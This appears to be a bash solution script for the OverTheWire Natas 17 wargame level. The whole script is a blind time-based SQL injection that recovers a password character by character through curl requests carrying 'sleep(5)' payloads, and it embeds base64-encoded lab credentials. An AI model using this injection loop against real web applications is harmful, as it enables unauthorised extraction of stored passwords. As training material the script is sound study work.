# Natas 17-> 18 ; SQL timing attack
front=''
for i in {1..65}
do
	for c in {A..Z} {a..z} {0..9}
	do
		change=0
		/usr/bin/time -f'%e' -o time.log\
		curl -s 'http://natas17.natas.labs.overthewire.org/' \
  		-H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==' \
		--data-raw 'username=natas18%22+and+password+like+binary+%22'$front$c'%25%22+and+sleep%285%29+%23' >/dev/null

		dur=$(cat time.log)
		if [[ $dur > 2 ]]
		then 
			change=1
			front=$front$c
			echo -e "found char $c \t-- $front"
			break
		fi
	done
	if [ $change == 0 ]; then echo "final: $front"; break ;fi
done
rm time.log
